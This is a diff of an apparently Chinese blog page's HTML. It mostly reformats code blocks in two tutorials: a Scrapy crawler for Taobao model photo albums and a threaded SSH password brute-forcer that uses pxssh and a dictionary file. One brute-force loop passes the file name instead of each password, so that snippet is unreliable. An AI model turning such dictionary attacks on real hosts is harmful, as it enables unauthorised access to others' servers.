+        db.close()<br/>
         return item
 </code></pre></li>
 </ol>
@@ -1066,27 +1045,24 @@ class tbModelPipeline(object):
 
 <ol>
 <li><p>获取相册列表的接口是一个GET请求，其中只有一个很重要的user_id，而这个user_id在上面拿去模特的基本信息已经拿到了，还有个page参数用于标识获取的是第几页数据(由于这个是第一页，并没有在url中显现出来，可以通过返回的html中包含的totalPage元素获得)不过这个接口的返回就不是标准的json格式了，而是一段html，这时候又到了利用scrapy中提供的强大的xpath功能了</p>
-
-<pre><code class="language-Python">def parse_album(self,response):
-   sel = Selector(response)
-   tbThumbItems = []
-   thumb_url_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/@href&quot;).extract()       
-   thumb_name_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/text()&quot;).extract()
-   user_id = response.meta[&#39;user_id&#39;]
-   for i in range(0,len(thumb_url_list)-1):
-       thumbItem = tbThumbItem()
-       thumbItem[&#39;thumb_name&#39;] = thumb_name_list[i].replace(&#39;\r\n&#39;,&#39;&#39;).replace(&#39; &#39;,&#39;&#39;)
-       thumbItem[&#39;thumb_url&#39;] = thumb_url_list[i]
-       thumbItem[&#39;thumb_userId&#39;] = str(user_id)
-       temp = self.urldecode(thumbItem[&#39;thumb_url&#39;])
-       thumbItem[&#39;thumb_id&#39;] = temp[&#39;album_id&#39;][0]
-       tbThumbItems.append(thumbItem)
+<pre><code class="language-python">def parse_album(self,response):
+   sel = Selector(response)<br/>
+   tbThumbItems = []<br/>
+   thumb_url_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/@href&quot;).extract()       <br/>
+   thumb_name_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/text()&quot;).extract()<br/>
+   user_id = response.meta[&#39;user_id&#39;]<br/>
+   for i in range(0,len(thumb_url_list)-1):<br/>
+       thumbItem = tbThumbItem()<br/>
+       thumbItem[&#39;thumb_name&#39;] = thumb_name_list[i].replace(&#39;\r\n&#39;,&#39;&#39;).replace(&#39; &#39;,&#39;&#39;)<br/>
+       thumbItem[&#39;thumb_url&#39;] = thumb_url_list[i]<br/>
+       thumbItem[&#39;thumb_userId&#39;] = str(user_id)<br/>
+       temp = self.urldecode(thumbItem[&#39;thumb_url&#39;])<br/>
+       thumbItem[&#39;thumb_id&#39;] = temp[&#39;album_id&#39;][0]<br/>
+       tbThumbItems.append(thumbItem)<br/>
    return tbThumbItems
 </code></pre></li>
 <li><p>获取相册里照片的接口就是一个完全的json格式的接口了,其中参数包括我们已经拿到的user_id以及album_id，page的最大范围totalPage依然可以通过第一次返回的response中的totalPage字段获得</p>
-
 <p><img src="https://pic.mylonly.com/2016-07-04_17:25:23.jpg" alt="2016-07-04_17:25:23.jpg"/></p>
-
 <p><img src="https://pic.mylonly.com/2016-07-04_17:25:46.jpg" alt="2016-07-04_17:25:46.jpg"/></p></li>
 </ol>
 
@@ -1128,7 +1104,7 @@ pxssh 是一个包含了pexpect库的专用脚本,它已经预先为我们写好
 
 <p>由于pxssh.login()函数执行失败会抛出异常，因此我们可以利用try...catch来捕获相应的异常来判断密码是否正确。（PS:其中的connection_lock.release()是信号量得释放操作）</p>
 
-<pre><code class="language-Python">def connect(host,user,password):
+<pre><code class="language-python">def connect(host,user,password):
     try:
         session = pxssh.pxssh()
         session.login(host,user,password)
@@ -1143,7 +1119,7 @@ pxssh 是一个包含了pexpect库的专用脚本,它已经预先为我们写好
 
 <p>由于我们准备从一个庞大的字典文件的读取密码，我们决定利用多线程来同时处理多个密码登陆操作用来加快速度。</p>
 
-<pre><code class="language-Python">password_file = open(password,&#39;r&#39;)
+<pre><code class="language-python">password_file = open(password,&#39;r&#39;)
 for line in password_file:
         thread = threading.Thread(target=connect,args=(host,user,password))
         thread.start()
@@ -1151,7 +1127,7 @@ for line in password_file:
 
 <p>可是像上面的代码,如果password_file是个巨大的密码文件，就为同时产生过多的线程，很容易造成服务器无法响应，为了控制同时存在的线程数量，我们这里采用threading中的BoundedSemaphore来控制最大连接数，也就是最多的允许线程数量,讲上面的代码改成如下这样:</p>
 
-<pre><code class="language-Python">maxConnections = 5
+<pre><code class="language-python">maxConnections = 5
 connection_lock = threading.BoundedSemaphore(maxConnections)
 password_file = open(password,&#39;r&#39;)
 for line in password_file:
@@ -1171,7 +1147,7 @@ for line in password_file:
 
 <h4 id="toc_3">完整代码</h4>
 
-<pre><code class="language-Python">from pexpect import pxssh
+<pre><code class="language-python">from pexpect import pxssh
 import threading
 import optparse
 import time
